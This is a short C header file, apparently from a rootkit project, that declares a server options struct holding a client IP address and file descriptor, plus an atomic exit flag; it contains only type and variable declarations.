#ifndef ROOTKIT_UTILS_H
#define ROOTKIT_UTILS_H

struct server_options {
    char * client_ip_address;
    int client_fd;
};

extern _Atomic int exit_flag;


#endif //ROOTKIT_UTILS_H